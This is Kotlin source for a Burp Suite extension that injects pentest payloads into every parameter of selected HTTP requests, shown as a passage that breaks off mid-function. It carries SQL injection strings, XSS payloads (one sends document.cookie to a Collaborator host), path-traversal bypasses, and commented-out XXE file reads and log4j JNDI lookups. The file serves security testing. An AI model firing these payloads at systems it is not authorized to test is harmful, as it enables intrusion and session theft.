package com.nickcoblentz.montoya

import MyExtensionSettings
import PathSlice
import burp.api.montoya.MontoyaApi
import burp.api.montoya.http.RedirectionMode
import burp.api.montoya.http.RequestOptions
import burp.api.montoya.http.message.HttpRequestResponse
import burp.api.montoya.http.message.params.HttpParameter
import burp.api.montoya.http.message.params.HttpParameterType
import burp.api.montoya.http.message.params.ParsedHttpParameter
import burp.api.montoya.http.message.requests.HttpRequest
import burp.api.montoya.http.message.responses.HttpResponse
import burp.api.montoya.ui.contextmenu.AuditIssueContextMenuEvent
import burp.api.montoya.ui.contextmenu.ContextMenuEvent
import burp.api.montoya.ui.contextmenu.ContextMenuItemsProvider
import burp.api.montoya.ui.contextmenu.WebSocketContextMenuEvent
import org.apache.commons.text.StringEscapeUtils
import pathSlices
import replacePathSlice
import java.awt.Component
import java.awt.Font
import java.awt.event.ActionEvent
import java.util.concurrent.Executors
import javax.swing.JLabel
import javax.swing.JMenuItem
import javax.swing.JSeparator
import kotlin.io.encoding.Base64


class EveryParameter2(private val api: MontoyaApi, private val myExtensionSettings : MyExtensionSettings) : ContextMenuItemsProvider {

    private var logger = MontoyaLogger(api, LogLevel.DEBUG)

//    private val sqliQuickMenuItem = JMenuItem("SQLi SLEEP PolyGlot")
    private val sqliLogicPayloadsMenuItem = JMenuItem("SQLi Logic Payloads")
    private val sqliConcatPayloadsMenuItem = JMenuItem("SQLi Concat Payloads")
//    private val sqliSingleQuoteCommentPayloadsMenuItem = JMenuItem("SQLi SingleQuoteCommentPayloads")
//    private val sqliDoubleQuoteCommentPayloadsMenuItem = JMenuItem("SQLi DoubleQuoteCommentPayloads")
    private val sqliErrorPayloadsMenuItem = JMenuItem("SQLi ErrorPayloads")
//    private val xssMapMenuItem = JMenuItem("XSS ASDF")
    private val xssPayloadsMenuItem = JMenuItem("XSS Payloads")
    private val blindXssImgMenuItem = JMenuItem("XSS Blind Img")
//    private val xmlOutOfBandMenuItem = JMenuItem("XML OutOfBand")
//    private val xmlFileMenuItem = JMenuItem("XML File")
//    private val urlPathSpecialCharsMenuItem = JMenuItem("URL Path Special Chars")
//    private val collabUrlMenuItem = JMenuItem("Collab Url")
//    private val log4jCollabMenuItem = JMenuItem("Log4J Collab")
//    private val maxForwardsMenuItem = JMenuItem("Max-Forwards")
//    private val minimizeMenuItem = JMenuItem("Minimize")
//    private val spoofIPMenuItem = JMenuItem("Spoof IP Using Headers")
//    private val dnsOverHTTPMenuItem = JMenuItem("DNS-over-HTTP")
    private val authorizationTestsMenuItem = JMenuItem("Authorization Tests")




    private val allMenuItems = mutableListOf<Component>(
        JLabel("  Every").apply {
            isEnabled = false
            font = font.deriveFont(Font.BOLD)
        },
//        JMenu("Others").apply {
//            add(sqliQuickMenuItem)
//            add(sqliSingleQuoteCommentPayloadsMenuItem)
//            add(sqliDoubleQuoteCommentPayloadsMenuItem)
//            add(xssMapMenuItem)
//            add(xmlOutOfBandMenuItem)
//            add(xmlFileMenuItem)
//            add(urlPathSpecialCharsMenuItem)
//            add(collabUrlMenuItem)
//            add(maxForwardsMenuItem)
//            add(log4jCollabMenuItem)
//            add(spoofIPMenuItem)
//            add(dnsOverHTTPMenuItem)
//            add(minimizeMenuItem)
//        },
        authorizationTestsMenuItem,
        sqliConcatPayloadsMenuItem,
        sqliLogicPayloadsMenuItem,
        sqliErrorPayloadsMenuItem,
        blindXssImgMenuItem,
        xssPayloadsMenuItem,
        JSeparator()
    )
    private var currentHttpRequestResponseList = mutableListOf<HttpRequestResponse>()
    private val executor = Executors.newVirtualThreadPerTaskExecutor()


    enum class ParameterType(val value: String) {
        PATH_SLICE("Path Slice"),
        URL_PARAMETER("URL Parameter"),
        POST_PARAMETER("Post Parameter"),
        JSON_PARAMETER("JSON Parameter"),
        HTTP_HEADER("HTTP Header"),
        HTTP_METHOD("HTTP Method"),
        COOKIE("Cookie"),
        MULTI_PART("Multi Part"),
        XML("XML"),
    }


    companion object {
        const val PLUGIN_NAME: String = "Every Parameter"
        const val testCaseCategoryHeader = "Z-Test-Case-Category"
        const val testCaseNameHeader = "Z-Test-Case-Name"
        const val testCaseParamTypeHeader = "Z-Test-Case-Param-Type"
        const val testCaseParamNameHeader = "Z-Test-Case-Param-Name"
        const val testCasePayloadHeader = "Z-Test-Case-Payload"
//        const val testCaseGrepStartHeader = "Z-Test-Case-Grep-Start"
//        const val testCaseGrepEndHeader = "Z-Test-Case-Grep-End"
        const val BAMBDA_CATEGORY="id: 138442cc-d174-4feb-9690-aa5eb89b9043\n" +
                "name: Test Case Category\n" +
                "function: CUSTOM_COLUMN\n" +
                "location: LOGGER\n" +
                "source: \"var headerName = \\\"Z-Test-Case-Category\\\";\\r\\nvar request = requestResponse.request();\\r\\\n" +
                "  \\nif(request.hasHeader(headerName)) {\\r\\n    return utilities().base64Utils().decode(request.headerValue(headerName));\\r\\\n" +
                "  \\n}\\r\\nreturn \\\"\\\";\""

        const val BAMBDA_NAME="id: 8e78a316-3cf7-49be-a13c-f8f17fd5b002\n" +
                "name: Test Case Name\n" +
                "function: CUSTOM_COLUMN\n" +
                "location: LOGGER\n" +
                "source: |-\n" +
                "  var headerName = \"Z-Test-Case-Name\";\n" +
                "  var request = requestResponse.request();\n" +
                "  if(request.hasHeader(headerName)) {\n" +
                "      return utilities().base64Utils().decode(request.headerValue(headerName));\n" +
                "  }\n" +
                "  return \"\";"
        const val BAMBDA_PAYLOAD="id: f08b766b-8a7f-412e-bc4a-37d9ca026d31\n" +
                "name: Test Case Payload\n" +
                "function: CUSTOM_COLUMN\n" +
                "location: LOGGER\n" +
                "source: \"var headerName = \\\"Z-Test-Case-Payload\\\";\\r\\nvar request = requestResponse.request();\\r\\\n" +
                "  \\nif(request.hasHeader(headerName)) {\\r\\n    return utilities().base64Utils().decode(request.headerValue(headerName));\\r\\\n" +
                "  \\n}\\r\\nreturn \\\"\\\";\""

        const val BAMBDA_PARAM_TYPE="id: d294fbde-546c-4347-919a-541ac84b69a9\n" +
                "name: Test Case Param Type\n" +
                "function: CUSTOM_COLUMN\n" +
                "location: LOGGER\n" +
                "source: \"var headerName = \\\"Z-Test-Case-Param-Type\\\";\\r\\nvar request = requestResponse.request();\\r\\\n" +
                "  \\nif(request.hasHeader(headerName)) {\\r\\n    return utilities().base64Utils().decode(request.headerValue(headerName));\\r\\\n" +
                "  \\n}\\r\\nreturn \\\"\\\";\"\n"

        const val BAMBDA_PARAM_NAME="id: 8afe9d40-965b-4161-8e7a-40b46a4d5a8d\n" +
                "name: Test Case Param Name\n" +
                "function: CUSTOM_COLUMN\n" +
                "location: LOGGER\n" +
                "source: \"var headerName = \\\"Z-Test-Case-Param-Name\\\";\\r\\nvar request = requestResponse.request();\\r\\\n" +
                "  \\nif(request.hasHeader(headerName)) {\\r\\n    return utilities().base64Utils().decode(request.headerValue(headerName));\\r\\\n" +
                "  \\n}\\r\\nreturn \\\"\\\";\"\n"

        fun requestHasTestCaseFields(request : HttpRequest) = request.hasHeader(testCaseCategoryHeader)
                && request.hasHeader(testCaseNameHeader)
                && request.hasHeader(testCasePayloadHeader)
                && request.hasHeader(testCaseParamTypeHeader)
                && request.hasHeader(testCaseParamNameHeader)

        fun extractTestCaseFieldFromRequest(field : String, request : HttpRequest) : String {
            if(request.hasHeader(field)) {
                val decodedBytes = Base64.decode(request.headerValue(field))
                return String(decodedBytes, Charsets.UTF_8)
            }
            return ""
        }
    }

    init {

        logger.debugLog("Starting Every Param...")

        api.userInterface().registerContextMenuItemsProvider(this)
//        sqliQuickMenuItem.addActionListener({ e -> sqliQuickActionPerformed(e) })
        sqliLogicPayloadsMenuItem.addActionListener({ e -> sqliLogicPayloadsActionPerformed(e) })
        sqliConcatPayloadsMenuItem.addActionListener({ e -> sqliConcatPayloadsActionPerformed(e) })
//        sqliSingleQuoteCommentPayloadsMenuItem.addActionListener({ e -> sqliSingleQuoteCommentPayloadsActionPerformed(e) })
//        sqliDoubleQuoteCommentPayloadsMenuItem.addActionListener({ e -> sqliDoubleQuoteCommentPayloadsActionPerformed(e) })
        sqliErrorPayloadsMenuItem.addActionListener({ e -> sqliErrorPayloadsActionPerformed(e) })
//        xssMapMenuItem.addActionListener({ e -> xssMapActionPerformed(e) })
//        xssPayloadsMenuItem.addActionListener({ e -> xssPayloadsActionPerformed(e) })
        xssPayloadsMenuItem.addActionListener({ e -> xssPayloadsActionPerformed(e) })
        blindXssImgMenuItem.addActionListener({ e -> blindXssImgActionPerformed(e) })
//        collabUrlMenuItem.addActionListener({ e -> collabUrlActionPerformed(e) })
//        xmlOutOfBandMenuItem.addActionListener({ e -> xmlOutOfBandActionPerformed(e) })
//        xmlFileMenuItem.addActionListener({ e -> xmlFileActionPerformed(e) })
//        urlPathSpecialCharsMenuItem.addActionListener({ e -> urlPathSpecialCharsActionPerformed(e) })
//        minimizeMenuItem.addActionListener({ e -> minimizeActionPerformed(e) })
//        log4jCollabMenuItem.addActionListener({ e -> log4jCollabActionPerformed(e) })
//        spoofIPMenuItem.addActionListener { e -> spoofIpActionPerformed(e) }
//        dnsOverHTTPMenuItem.addActionListener { e-> dnsOverHTTPActionPerformed(e)}
//        maxForwardsMenuItem.addActionListener { e-> maxForwardsActionPerformed(e)}
        authorizationTestsMenuItem.addActionListener { e -> authorizationTestsActionPerformed(e) }

        api.bambda().importBambda(BAMBDA_CATEGORY)
        api.bambda().importBambda(BAMBDA_NAME)
        api.bambda().importBambda(BAMBDA_PAYLOAD)
        api.bambda().importBambda(BAMBDA_PARAM_NAME)
        api.bambda().importBambda(BAMBDA_PARAM_TYPE)

        logger.debugLog("...Finished Every Param")
    }


    fun getHeadersToSkip() = myExtensionSettings.ignoreHeadersSetting.split(",").map { it.trim().lowercase() }

    override fun provideMenuItems(event: ContextMenuEvent): MutableList<Component> {
        if(event.selectedRequestResponses().isNotEmpty())
            currentHttpRequestResponseList=event.selectedRequestResponses()
        else if(event.messageEditorRequestResponse().isPresent)
            currentHttpRequestResponseList=mutableListOf(event.messageEditorRequestResponse().get().requestResponse())

        logger.debugLog("Found ${currentHttpRequestResponseList.size} requests")
        if(currentHttpRequestResponseList.isNotEmpty())
            return allMenuItems
        return mutableListOf<Component>()
    }

    override fun provideMenuItems(event: WebSocketContextMenuEvent?): MutableList<Component> {
        return mutableListOf<Component>()
    }

    override fun provideMenuItems(event: AuditIssueContextMenuEvent?): MutableList<Component> {
        return mutableListOf<Component>()
    }

    // region Test Cases
    private fun authorizationTestsActionPerformed(e: ActionEvent) {
        logger.debugLog("Enter")
        val category = "Authorization"
        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
        myHttpRequestResponses.forEach { testCaseRequestResponse ->
            val testCases = mutableListOf<HttpRequest>()
            executor.submit {
                testCases.add(labelTestCase(testCaseRequestResponse.request(),category,"Original Request","","",""))

                val sliceTestCases = replaceAllPathSlicesAndLabel(testCaseRequestResponse.request(),category,"Change Capitalization on Slices") { slice ->
                    invertCapitalization(slice.value)
                }
                testCases.addAll(sliceTestCases)

                val testCaseMethod = testCaseRequestResponse.request().withMethod(invertCapitalization(testCaseRequestResponse.request().method()))
                testCases.add(labelTestCase(testCaseMethod,category,"Invert Method Capitalization", ParameterType.HTTP_METHOD.value,testCaseRequestResponse.request().method(),testCaseMethod.method()))

                val pathWordList=listOf("","#","#/",".",";",".;",";.","/;/","api","%%%%20","%20","%09","/.//./","//.","%00","%0D","%0A","static","js","img","images","ico","icons","media","static","assets","css","downloads","download","documents","docs","pdf","uploads","_next",".well-known")
                pathWordList.forEach { prefix ->
                    val payloads = listOf(
                        "/$prefix/..${testCaseRequestResponse.request().path()}",
                        "//$prefix/..${testCaseRequestResponse.request().path()}",
                        "/$prefix/%2e%2e${testCaseRequestResponse.request().path()}",
                        "/$prefix%2f%2e%2e${testCaseRequestResponse.request().path()}",
                        "%2f$prefix%2f%2e%2e${testCaseRequestResponse.request().path()}",
                        "%2f%2f$prefix%2f%2e%2e${testCaseRequestResponse.request().path()}",
                        "./${testCaseRequestResponse.request().path()}",
                        "%2e%2f${testCaseRequestResponse.request().path()}",
                        "./$prefix/..${testCaseRequestResponse.request().path()}",
                        "%2e%2f$prefix%2f%2e%2e${testCaseRequestResponse.request().path()}",
                    )

                    payloads.forEach { payload ->
                        val prefixTestCase = testCaseRequestResponse.request().withPath(payload)
                        testCases.add(labelTestCase(prefixTestCase,category,"Use Static Dir with dot dot slash",
                            ParameterType.PATH_SLICE.value,"URL Path Prefix", payload))
                    }
                }

                val headerList=listOf(
                    "X-Rewrite-Url",
                    "X-Original-Url"
                )

                headerList.forEach { headerName ->
                    val payload = testCaseRequestResponse.request().pathWithoutQuery()
                    val headerTestCase = testCaseRequestResponse.request().withAddedHeader(headerName,payload).withPath("/")
                    testCases.add(labelTestCase(headerTestCase,category,"Use Headers To Change URL", ParameterType.HTTP_HEADER.value,headerName,payload))
                }

                testCases.forEach {
                    sendRequestConsiderSettings(it)
                }
            }
        }
        logger.debugLog("Exit")
    }

    fun sqliConcatPayloadsActionPerformed(event: ActionEvent?) {
        logger.debugLog("Enter")
        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
        val category = "SQL Injection"
        val testCaseName = "Concatenate"
        iterateThroughParametersWithPayload(myHttpRequestResponses,category,testCaseName,"'+'",PayloadUpdateMode.INSERT_MIDDLE)
        iterateThroughParametersWithPayload(myHttpRequestResponses,category,testCaseName,"'||'",PayloadUpdateMode.INSERT_MIDDLE)
        iterateThroughParametersWithPayload(myHttpRequestResponses,category,testCaseName,"' '",PayloadUpdateMode.INSERT_MIDDLE)
        iterateThroughParametersWithPayload(myHttpRequestResponses,category,testCaseName,"\"+\"",PayloadUpdateMode.INSERT_MIDDLE)
        iterateThroughParametersWithPayload(myHttpRequestResponses,category,testCaseName,"\"||\"",PayloadUpdateMode.INSERT_MIDDLE)
        iterateThroughParametersWithPayload(myHttpRequestResponses,category,testCaseName,"\" \"",PayloadUpdateMode.INSERT_MIDDLE)
        logger.debugLog("Exit")
    }

    fun sqliLogicPayloadsActionPerformed(event: ActionEvent?) {
        logger.debugLog("Enter")
        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
        val category = "SQL Injection"
        val testCaseName = "Binary Logic"
        val payloads = listOf(
            " or 1=1 or 1=",
            "' or 'a'='a' or 'a'='",
            " or 1=1 or 1=",
            "' or 'a'='a' or 'a'='"
        )

        payloads.forEach { payload ->
            iterateThroughParametersWithPayload(myHttpRequestResponses,category,testCaseName,payload,PayloadUpdateMode.APPEND)
        }

        logger.debugLog("Exit")
    }

    fun sqliErrorPayloadsActionPerformed(event: ActionEvent?) {
        logger.debugLog("Enter")
        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
        val category = "SQL Injection"
        val testCaseName = "Binary Logic"
        val payloads = listOf(
            "'\","
        )

        payloads.forEach { payload ->
            iterateThroughParametersWithPayload(myHttpRequestResponses,category,testCaseName,payload,PayloadUpdateMode.APPEND)
        }

        logger.debugLog("Exit")
    }

    fun blindXssImgActionPerformed(event: ActionEvent?) {
        logger.debugLog("Enter")
        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
        val category = "XSS"
        val testCaseName = "Blind Image"
        val payloads = listOf(
            "'\"><img src=\"https://${api.collaborator().defaultPayloadGenerator().generatePayload()}/blindimg.png\">",
            "'\"><iframe src='javascript:window.location=\"https://${api.collaborator().defaultPayloadGenerator().generatePayload()}/iframe-src?\"+btoa(parent.document.location)'></iframe>",
            "'\"><object data='javascript:window.location=\"https://${api.collaborator().defaultPayloadGenerator().generatePayload()}/object-src?\"+btoa(parent.document.location)'></object>",
            "'\"><script src=\"https://${api.collaborator().defaultPayloadGenerator().generatePayload()}/script-tag\"></script>",
            "'\"><style src=\"https://${api.collaborator().defaultPayloadGenerator().generatePayload()}/style-tag\"></style>",
            "'\"><img src=x onerror=\"new Image().src='https://${api.collaborator().defaultPayloadGenerator().generatePayload()}/imgerror.png?c='+btoa(document.cookie)\">",
            " ![](https://${api.collaborator().defaultPayloadGenerator().generatePayload()}/blindmarkdownimg.png) "
        )

        payloads.forEach { payload ->
                iterateThroughParametersWithPayload(myHttpRequestResponses,category,testCaseName,payload,PayloadUpdateMode.APPEND)
        }
        logger.debugLog("Exit")
    }

    fun xssPayloadsActionPerformed(event: ActionEvent?) {
        logger.debugLog("Enter")
        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
        val category = "XSS"
        val testCaseName = "Blind Image"
        val payloads = listOf(
            "'\">asdffindmeasdf",
            "'\"><h2>heading here</h2>asdffindmeasdf",
            "'\"><script>alert(1)</script>asdffindmeasdf",
            "'\"＞＜script＞alert(1)＜/script＞asdffindmeasdf",
            "\n\n## asdffindmeasdf\n\n"
        )

        payloads.forEach { payload ->
            iterateThroughParametersWithPayload(myHttpRequestResponses,category,testCaseName,payload,PayloadUpdateMode.APPEND)
        }
        logger.debugLog("Exit")
    }

    // endregion

    // region Insertion and Labeling
    private fun replaceAllPathSlicesAndLabel(request: HttpRequest, categoryLabel: String, testNameLabel: String, payloadCallback: (slice: PathSlice) -> String) : List<HttpRequest> {
        val testCases = mutableListOf<HttpRequest>()
        request.pathSlices().forEach { slice ->
            val payload = payloadCallback(slice)
            val testCase = labelTestCase(request.replacePathSlice(slice,payload), categoryLabel, testNameLabel, ParameterType.PATH_SLICE.value, slice.value,payload)
            testCases.add(testCase)
        }

        return testCases
    }

    // endregion

    // region Payload Generation

    private fun invertCapitalization(text : String) = text.map { char ->
        if (char.isUpperCase()) char.lowercaseChar() else char.uppercaseChar()
    }.joinToString("")

    // endregion


    private fun labelTestCase(request : HttpRequest, category: String, testName: String, parameterType: String, parameterName: String, payload: String) : HttpRequest {
        return request.withAddedHeader(testCaseCategoryHeader,api.utilities().base64Utils().encodeToString(category))
            .withAddedHeader(testCaseNameHeader,api.utilities().base64Utils().encodeToString(testName))
            .withAddedHeader(testCasePayloadHeader,api.utilities().base64Utils().encodeToString(payload))
            .withAddedHeader(testCaseParamNameHeader,api.utilities().base64Utils().encodeToString(parameterName))
            .withAddedHeader(testCaseParamTypeHeader,api.utilities().base64Utils().encodeToString(parameterType))

    }

// region rewrite
//    fun maxForwardsActionPerformed(event: ActionEvent?) {
//        logger.debugLog("Enter")
//        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
//        for (httpRequestResponse in myHttpRequestResponses) {
//            (0..5).forEach {   logger.debugLog("TRACE $it");sendRequest(httpRequestResponse.request().withMethod("TRACE").withBody("").withAddedHeader("Max-Forwards",it.toString()),"Max-Forwards: TRACE $it") }
//            (0..5).forEach { sendRequest(httpRequestResponse.request().withMethod("GET").withBody("").withAddedHeader("Max-Forwards",it.toString()),"Max-Forwards: GET $it") }
//            (0..5).forEach { sendRequest(httpRequestResponse.request().withMethod("HEAD").withBody("").withAddedHeader("Max-Forwards",it.toString()),"Max-Forwards: HEAD $it") }
//        }
//
//        logger.debugLog("Exit")
//    }
//
//    fun dnsOverHTTPActionPerformed(event: ActionEvent?) {
//        logger.debugLog("Enter")
//
//        val listOfHosts = currentHttpRequestResponseList.map { it.httpService()?.host() }.distinct()
//        for(host in listOfHosts) {
//
//            val request1 = HttpRequest.httpRequestFromUrl("https://$host/dns-query?dns=EjQBAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE").withUpdatedHeader("Accept","application/dns-message")
//            val request2 = HttpRequest.httpRequestFromUrl("https://$host/dns-query?name=example.com&type=A").withUpdatedHeader("Accept","application/dns-json")
//            val request3 = HttpRequest.httpRequestFromUrl("https://$host/dns-query").withUpdatedHeader("Accept","application/dns-message").withMethod("POST").withBody("\\u00124\\u0001\\u0000\\u0000\\u0001\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0007example\\u0003com\\u0000\\u0000\\u0001\\u0000\\u0001")
//
//            sendRequest(request1,"DNS-over-HTTP GET B64")
//            sendRequest(request2,"DNS-over-HTTP GET JSON")
//            sendRequest(request3,"DNS-over-HTTP POST Binary")
//        }
//
//        logger.debugLog("Exit")
//    }
//
//    fun spoofIpActionPerformed(event: ActionEvent?) {
//        logger.debugLog("Enter")
//        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
//        val collabGenerator = api.collaborator().defaultPayloadGenerator()
//
//        val spoofPayloads = listOf("127.0.0.1","0","0.0.0.0","10.0.0.2","192.168.0.2",collabGenerator.generatePayload().toString())
//        val headers = listOf("CF-Connecting-IP","Client-IP","Forwarded","Forwarded-For","Forwarded-For-Ip","From","Front-End-Https","Origin","Referer","True-Client-IP","Via","X-Azure-ClientIP","X-Azure-SocketIP","X-Client-IP","X-Custom-IP-Authorization","X-Forward","X-Forward-For","X-Forwarded","X-Forwarded-By","X-Forwarded-For","X-Forwarded-For-Original","X-Forwarded-Host","X-Forwarded-Proto","X-Forwarded-Server","X-Forwarded-Ssl","X-Forwared-Host","X-Host","X-HTTP-Host-Override","X-Originating-IP","X-ProxyUser-Ip","X-Real-IP","X-Remote-Addr","X-Remote-IP")
//        val justHost = listOf("Host")
//        for(spoofPayload in spoofPayloads) {
//            addOrReplacePayloadForHeaders(myHttpRequestResponses,headers,spoofPayload,"Spoof IP: $spoofPayload")
//            addOrReplacePayloadForHeaders(myHttpRequestResponses,justHost,spoofPayload,"Spoof IP, Host: $spoofPayload")
//        }
//
//        for(httpRequestResponse in myHttpRequestResponses) {
//            val resolvedIp = httpRequestResponse.httpService().ipAddress()
//            addOrReplacePayloadForHeaders(listOf(httpRequestResponse),headers,resolvedIp,"Spoof IP, Server IP: $resolvedIp")
//        }
//        logger.debugLog("Exit")
//    }
//
//    fun addOrReplacePayloadForHeaders(httpRequestResponses : List<HttpRequestResponse>,headers : List<String>, payload : String, annotation : String) {
//        logger.debugLog("Enter")
//        for(httpRequestResponse in httpRequestResponses)
//        {
//            var currentHttpRequest = httpRequestResponse.request()
//            logger.debugLog("Found request: ${currentHttpRequest.url()}")
//
//
//            for(header in headers) {
//                logger.debugLog("Adding header: $header, ${payload}")
//                if(currentHttpRequest.hasHeader(header)) {
//                    currentHttpRequest = currentHttpRequest.withUpdatedHeader(header,payload)
//                }
//                else {
//                    currentHttpRequest = currentHttpRequest.withAddedHeader(header,payload)
//                }
//
//            }
//            sendRequest(currentHttpRequest,annotation)
//        }
//        logger.debugLog("Exit")
//    }
//
//    fun sqliQuickActionPerformed(event: ActionEvent?) {
//        logger.debugLog("Enter")
//        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
//        iterateThroughParametersWithPayload(myHttpRequestResponses,"SLEEP(10) /*' or SLEEP(10) or'\" or SLEEP(10) or \"*/",PayloadUpdateMode.REPLACE, "SQLi Polyglot-SLEEP \"")
//        logger.debugLog("Exit")
//    }
//
//    fun urlPathSpecialCharsActionPerformed(event: ActionEvent?) {
//        logger.debugLog("Enter")
//        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
//        val payloads=listOf("_","-",",",";",":","!","?",".",".aaa",".action",".css",".do",".html",".png","'","\"","(","(4danlfat035muve4g0mvgfrr)","(S(4danlfat035muve4g0mvgfrr))",")","[","[]","[1]","[a]","]","{","{}","{1}","{a}","}","@","*","/","/1","/a","\\","\\1","\\a","&","#","%","%00","%00aaa","%0a","%0a%0a","%0d","%21","%22","%23","%24","%25","%26","%27","%28","%29","%2a","%2A","%2b","%2B","%2c","%2C","%2d","%2D","%2E","%2f","%2F","%3a","%3A","%3b","%3B","%3C","%3c%3e","%3d","%3D","%3E","%3f","%3F","%40","%5B","%5b%5d","%5b1%5d","%5ba%5d","%5c","%5C","%5D","%5e","%5E","%5f","%5F","%60","%7B","%7b%7d","%7b1%7d","%7ba%7d","%7c","%7C","%7D","%7e","%7E","`","^","+","<","<>","=",">","|","~","$")
//        for(httpRequestResponse in myHttpRequestResponses) {
//            val path = httpRequestResponse.request().path()
//            //var index = path.indexOf("/")
//            var indices = path.indices.filter { index -> path[index]=='/' }.toMutableList()
//            indices.add(-1)
//            indices.add(httpRequestResponse.request().pathWithoutQuery().length-1)
//            //while (index >= 0) {
//            for(index in indices) {
//                for (payload in payloads) {
//                    val pathWithPayload = StringBuilder(path).insert(index+1,payload)
//                    sendRequest(httpRequestResponse.request().withPath(pathWithPayload.toString()).withUpdatedContentLength(),"URL Special Chars, index: ${index}, payload: ${payload}")
//                }
//                //index = path.indexOf("/", index + 1)
//            }
//
//        }
//        logger.debugLog("Exit")
//    }
//
//
//    fun xmlOutOfBandActionPerformed(event: ActionEvent?) {
//        logger.debugLog("Enter")
//        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
//        val collabGenerator = api.collaborator().defaultPayloadGenerator()
//        iterateThroughParametersWithPayload(myHttpRequestResponses,"<!DOCTYPE root [ <!ENTITY % ext SYSTEM \"https://${collabGenerator.generatePayload().toString()}/entity\"> %ext;]>",PayloadUpdateMode.PREPEND, "XML Entity OOB-Prepend")
//        iterateThroughParametersWithPayload(myHttpRequestResponses,"<?xml version=\"1.0\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"https://${collabGenerator.generatePayload().toString()}/entity\"> ]><test>&xxe</test>",PayloadUpdateMode.REPLACE, "XML Entity OOB-Replace")
//        iterateThroughParametersWithPayload(myHttpRequestResponses,"<!DOCTYPE asdfa PUBLIC \"-//B/A/EN\" \"https://${collabGenerator.generatePayload().toString()}/dtd\">",PayloadUpdateMode.PREPEND, "XML DTD OOB-Prepend")
//        iterateThroughParametersWithPayload(myHttpRequestResponses,"<!DOCTYPE asdfa PUBLIC \"-//B/A/EN\" \"https://${collabGenerator.generatePayload().toString()}/dtd\"><asdfa></asdfa>",PayloadUpdateMode.REPLACE, "XML DTD OOB-Replace")
//        logger.debugLog("Exit")
//    }
//
//    fun xmlFileActionPerformed(event: ActionEvent?) {
//        logger.debugLog("Enter")
//        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
//        iterateThroughParametersWithPayload(myHttpRequestResponses,"<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/hosts'>]>",PayloadUpdateMode.PREPEND, "XML Entity File-Prepend,Linux")
//        iterateThroughParametersWithPayload(myHttpRequestResponses,"<!DOCTYPE root [<!ENTITY test SYSTEM 'file://c/windows/system32/drivers/etc/hosts'>]>",PayloadUpdateMode.PREPEND, "XML Entity File-Prepend,Windows")
//        iterateThroughParametersWithPayload(myHttpRequestResponses,"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/hosts'>]><root>&test;</root>",PayloadUpdateMode.REPLACE, "XML Entity File-Replace,Linux")
//        iterateThroughParametersWithPayload(myHttpRequestResponses,"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file://c/windows/system32/drivers/etc/hosts'>]><root>&test;</root>",PayloadUpdateMode.REPLACE, "XML Entity File-Replace,Windows")
//
//        logger.debugLog("Exit")
//    }
//

//

//
//    fun sqliSingleQuoteCommentPayloadsActionPerformed(event: ActionEvent?) {
//        logger.debugLog("Enter")
//        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
//        iterateThroughParametersWithPayload(myHttpRequestResponses,"'-- ",PayloadUpdateMode.APPEND, "SQLi comment'")
//        iterateThroughParametersWithPayload(myHttpRequestResponses,"')-- ",PayloadUpdateMode.APPEND, "SQLi comment)'")
//        logger.debugLog("Exit")
//    }
//
//    fun sqliDoubleQuoteCommentPayloadsActionPerformed(event: ActionEvent?) {
//        logger.debugLog("Enter")
//        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
//        iterateThroughParametersWithPayload(myHttpRequestResponses,"\"-- ",PayloadUpdateMode.APPEND, "SQLi comment'")
//        iterateThroughParametersWithPayload(myHttpRequestResponses,"\")-- ",PayloadUpdateMode.APPEND, "SQLi comment)'")
//        logger.debugLog("Exit")
//    }
//

//
//    fun xssMapActionPerformed(event: ActionEvent?) {
//        logger.debugLog("Enter")
//        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
//        iterateThroughParametersWithPayload(myHttpRequestResponses,"'\">asdf",PayloadUpdateMode.APPEND, "XSS asdf")
//        logger.debugLog("Exit")
//    }
//

//
//    fun collabUrlActionPerformed(event: ActionEvent?) {
//        logger.debugLog("Enter")
//        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
//        iterateThroughParametersWithPayload(myHttpRequestResponses,"https://${api.collaborator().defaultPayloadGenerator().generatePayload().toString()}/collaburl",PayloadUpdateMode.REPLACE, "Collab URL")
//        iterateThroughParametersWithPayload(myHttpRequestResponses,"test@${api.collaborator().defaultPayloadGenerator().generatePayload().toString()}",PayloadUpdateMode.REPLACE, "Collab EMail")
//        logger.debugLog("Exit")
//    }
//
//    fun log4jCollabActionPerformed(event: ActionEvent?) {
//        logger.debugLog("Enter")
//        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
//        iterateThroughParametersWithPayload(myHttpRequestResponses,"\${jndi:ldap://${api.collaborator().defaultPayloadGenerator().generatePayload().toString()}/}",PayloadUpdateMode.REPLACE, "log4j ldap")
//        iterateThroughParametersWithPayload(myHttpRequestResponses,"\${jndi:dns://${api.collaborator().defaultPayloadGenerator().generatePayload().toString()}/}",PayloadUpdateMode.REPLACE, "log4j dns")
//        iterateThroughParametersWithPayload(myHttpRequestResponses,"\${jndi:https://${api.collaborator().defaultPayloadGenerator().generatePayload().toString()}/}",PayloadUpdateMode.REPLACE, "log4j https")
//        logger.debugLog("Exit")
//    }
//

//
//    fun minimizeActionPerformed(event: ActionEvent?) {
//        logger.debugLog("Enter")
//        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
//        executor.submit {
//
//            for (httpRequestResponse in myHttpRequestResponses) {
//                if (httpRequestResponse.hasResponse()) {
//                    for (httpRequestResponse in myHttpRequestResponses) {
//                        val originalRequest = httpRequestResponse.request()
//                        val originalResponse = httpRequestResponse.response()
//                        var currentRequest = originalRequest
//
